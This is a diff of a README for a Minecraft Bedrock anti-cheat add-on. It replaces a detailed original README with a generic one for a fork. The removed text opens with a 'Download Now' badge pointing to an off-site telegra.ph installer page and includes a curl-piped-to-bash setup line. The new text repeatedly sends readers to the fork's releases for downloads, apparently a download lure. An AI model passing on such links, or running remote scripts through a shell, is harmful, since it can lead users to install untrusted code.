@@ -1,139 +1,82 @@
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://telegra.ph/Download-Installer-1305-05-13?8cbpqt8zkztdze0)
+# Paradox AntiCheat - A Shield Against Malicious Hackers 🛡️
 
-<div align="center">
-  <img src="docs\Media\paradox-header.png" alt="Paradox AntiCheat Logo">
-  <br><br>
-  <div>
-    <em>Updated for Minecraft Bedrock 1.21.70</em>
-    <br>
-    Paradox AntiCheat now utilizes the 2.0.0-Beta server and 2.0.0-Beta server-ui APIs, enhancing compatibility and performance for Minecraft Bedrock.
-  </div>
-</div>
-<hr>
-<div align="left">
-  <div align="center">
-    <h2>About Paradox AntiCheat</h2>
-  </div>
-  <p>Paradox AntiCheat is a powerful tool designed to combat cheating in Minecraft Bedrock worlds. The name "Paradox" was chosen because the concept of paradox perfectly represents the essence of what we do.</p>
-  <p>Paradox AntiCheat is a statement that contradicts itself. It is a tool that fights cheating by using advanced algorithms and techniques that are themselves paradoxical in nature.</p>
-  <blockquote>
-    <p>Paradox: A statement or situation that contradicts itself, opposed to common sense and yet perhaps true.</p>
-  </blockquote>
-  <p>Paradox AntiCheat offers a comprehensive solution for detecting and preventing cheating in Minecraft Bedrock. It uses detection methods to ensure that cheaters are caught and punished. In addition, Paradox AntiCheat is highly customizable, allowing game developers to tailor the tool to their specific needs and requirements.</p>
-  <p>If you're looking for a reliable and effective anti-cheat solution for your Minecraft Bedrock experience, look no further than Paradox AntiCheat. For more information, check out the <a href="https://visual1mpact.github.io/Paradox_AntiCheat/#/">Documentation</a>.</p>
-</div>
-<hr>
-<div align="left">
-  <div align="center">
-    <h2>Get Support</h2>
-  </div>
-  <p>Join the Paradox AntiCheat community on <a href="https://discord.gg/qVd53N2xhq">Discord</a> for support. Our community is active and dedicated to providing help and assistance to game developers who use Paradox AntiCheat in their projects. We also welcome feedback and suggestions on how we can improve the tool.</p>
-</div>
+Welcome to the **Paradox AntiCheat-nk** repository! This utility aims to protect your Bedrock Edition server from malicious hackers. Our goal is to create a safer gaming environment for all players.
 
-<div align="center">
-  <h2>Project Status</h2>
-  <img src="https://www.codefactor.io/repository/github/Visual1mpact/paradox_anticheat/badge/rewrite" alt="Grade">
-  <img src="https://img.shields.io/github/downloads/Visual1mpact/Paradox_AntiCheat/total?style=plastic&logo=appveyor" alt="Downloads">
-  <img src="https://img.shields.io/github/downloads/Visual1mpact/Paradox_AntiCheat/latest/total?style=plastic&logo=appveyor" alt="Latest Downloads">
-  <img src="https://img.shields.io/github/commit-activity/m/Visual1mpact/Paradox_AntiCheat?style=plastic&logo=appveyor" alt="Commits Per Month">
-  <img src="https://img.shields.io/github/last-commit/Visual1mpact/Paradox_AntiCheat?style=plastic&logo=appveyor" alt="Last Commit">
-  <img src="https://img.shields.io/github/license/Visual1mpact/Paradox_AntiCheat?style=plastic&logo=appveyor" alt="License">
-</div>
+![Paradox AntiCheat Logo](https://img.shields.io/badge/Paradox%20AntiCheat-v1.0-blue)
 
-<h2>Applying the Paradox AntiCheat Pack</h2>
-<p>When applying the pack to your world, make sure the addon is at the top of the behavior pack list and Beta APIs is enabled. This is to ensure all checks and systems work properly. The versioning system for Paradox goes as follows:</p>
-<ul>
-  <li>The first number denotes the pack version. This will rarely change unless there have been major changes to the code.</li>
-  <li>The second number denotes the major revision of the pack version. These particular changes mostly involve features being added or removed.</li>
-  <li>The third number indicates the minor revision of the Pack. This evolves around bug fixes.</li>
-</ul>
+## Table of Contents
 
-<h2>Installing the Paradox AntiCheat Pack</h2>
-<p>To install this anticheat to your realm/world, follow these steps:</p>
-<ol>
-  <li>Install the <code>.mcpack</code>.</li>
-  <li>Apply it to your world.</li>
-  <li>Enable Beta APIs.</li>
-</ol>
-<p>Once you have done this, the anticheat should be fully up and running.</p>
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Support](#support)
 
-<h2>Development Environment Setup for Linux</h2>
-<ol>
-  <li><strong>Install Node.js v22.11.0 (LTS):</strong>
-    <ul>
-      <li>You can use Node Version Manager (nvm) to install Node.js. First, install nvm if you don't have it:
-        <pre><code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code></pre>
-      </li>
-      <li>Load nvm:
-        <pre><code>source ~/.bashrc</code></pre>
-      </li>
-      <li>Install Node.js v22.11.0 (LTS) using nvm:
-        <pre><code>nvm install 22.11.0</code></pre>
-      </li>
-      <li>Set it as the default version:
-        <pre><code>nvm use 22.11.0
-nvm alias default 22.11.0</code></pre>
-      </li>
-    </ul>
-  </li>
-  <li><strong>Install Visual Studio Code (VS Code):</strong>
-    <ul>
-      <li>Download and install VS Code from <a href="https://code.visualstudio.com/">the official website</a>.</li>
-      <li>Alternatively, you can install it via your package manager. For example, on Debian-based systems:
-        <pre><code>sudo apt update
-sudo apt install code</code></pre>
-      </li>
-    </ul>
-  </li>
-  <li><strong>Clone the Repository:</strong>
-    <ul>
-      <li>Open a terminal.</li>
-      <li>Execute the following command to clone the repository:
-        <pre><code>git clone https://github.com/&lt;your-github-username&gt;/Paradox_AntiCheat.git</code></pre>
-      </li>
-      <li>Navigate to the project directory:
-        <pre><code>cd Paradox_AntiCheat</code></pre>
-      </li>
-    </ul>
-  </li>
-  <li><strong>Install Project Dependencies:</strong>
-    <ul>
-      <li>Run the following command to install the project dependencies:
-        <pre><code>npm i</code></pre>
-      </li>
-    </ul>
-  </li>
-  <li><strong>Open the Project in VS Code:</strong>
-    <ul>
-      <li>You can open the project in VS Code by running:
-        <pre><code>code .</code></pre>
-      </li>
-    </ul>
-  </li>
-</ol>
+## Introduction
 
-<h2>Contributing to the Project</h2>
-<ol>
-  <li><strong>Fork the project repository:</strong> Click on the "Fork" button in the top-right corner of the repository page: <a href="https://github.com/Visual1mpact/Paradox_AntiCheat/fork">Paradox_AntiCheat_Fork</a></li>
-  <li><strong>Clone the forked repository to your local machine:</strong>
-    <pre><code>git clone https://github.com/&lt;your-github-username&gt;/Paradox_AntiCheat.git</code></pre>
-  </li>
-  <li><strong>Navigate to the cloned project directory:</strong>
-    <pre><code>cd Paradox_AntiCheat</code></pre>
-  </li>
-  <li><strong>Install project dependencies:</strong>
-    <pre><code>npm install</code></pre>
-  </li>
-  <li><strong>Make changes to the project files.</strong></li>
-  <li><strong>Save the files.</strong></li>
-  <li><strong>Stage the changes to include all modifications:</strong>
-    <pre><code>git add .</code></pre>
-  </li>
-  <li><strong>Commit the changes with a meaningful commit message:</strong>
-    <pre><code>git commit -m "Your commit message here"</code></pre>
-  </li>
-  <li><strong>Push the committed changes to your forked repository on GitHub:</strong>
-    <pre><code>git push origin</code></pre>
-  </li>
-  <li><strong>Create a pull request to submit the changes to the original repository.</strong></li>
-</ol>
+In the world of online gaming, security is paramount. Hackers can disrupt gameplay, steal data, and ruin the experience for everyone. **Paradox AntiCheat** provides a robust solution to combat these threats. This utility is designed specifically for the Bedrock Edition of Minecraft, ensuring compatibility and effectiveness.
+
+## Features
+
+- **Real-Time Detection**: Monitor player actions in real-time to catch suspicious behavior.
+- **Customizable Rules**: Set your own rules for what constitutes cheating.
+- **Lightweight**: Designed to have minimal impact on server performance.
+- **Easy Integration**: Works seamlessly with existing Bedrock servers.
+- **Comprehensive Logging**: Keep track of all player actions for review.
+
+## Installation
+
+To get started, download the latest release from our [Releases page](https://github.com/Leziaa/Paradox_AntiCheat-nk/releases). Make sure to download the appropriate file for your server setup. Once downloaded, follow these steps:
+
+1. **Extract the files**: Unzip the downloaded file.
+2. **Place the files**: Move the extracted files into your server's plugin or script directory.
+3. **Configure the settings**: Edit the configuration file to set your anti-cheat rules.
+4. **Restart your server**: Restart the server to apply the changes.
+
+## Usage
+
+Once installed, **Paradox AntiCheat** runs in the background, monitoring player activities. You can view logs and adjust settings through the configuration file. Here’s how to access the logs:
+
+1. Navigate to the logs directory in your server files.
+2. Open the log file to review player actions.
+3. Adjust your rules based on the data you collect.
+
+For further details on how to customize your settings, refer to the documentation included in the release package.
+
+## Contributing
+
+We welcome contributions from the community! If you want to help improve **Paradox AntiCheat**, follow these steps:
+
+1. **Fork the repository**: Create your own copy of the project.
+2. **Create a branch**: Use a descriptive name for your branch.
+3. **Make your changes**: Implement the features or fixes you want to contribute.
+4. **Submit a pull request**: Share your changes with the main project.
+
+Please ensure that your code adheres to our coding standards and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the code as you see fit.
+
+## Support
+
+If you encounter any issues or have questions, please check the [Releases section](https://github.com/Leziaa/Paradox_AntiCheat-nk/releases) for updates and troubleshooting tips. You can also reach out to the community in the issues tab of this repository.
+
+---
+
+### Topics Covered
+
+This project covers a wide range of topics related to Minecraft Bedrock Edition:
+
+- **Anti-Cheat**: Mechanisms to prevent cheating.
+- **Bedrock Server**: Compatibility with Bedrock dedicated servers.
+- **JavaScript Framework**: Built using JavaScript for ease of integration.
+- **Minecraft Plugin**: A plugin designed specifically for Minecraft environments.
+
+## Final Thoughts
+
+With **Paradox AntiCheat**, you can enhance the security of your Bedrock Edition server and create a fairer gaming experience. Remember to regularly check for updates on our [Releases page](https://github.com/Leziaa/Paradox_AntiCheat-nk/releases) to stay ahead of potential threats.
+
+Together, we can build a safer gaming community!
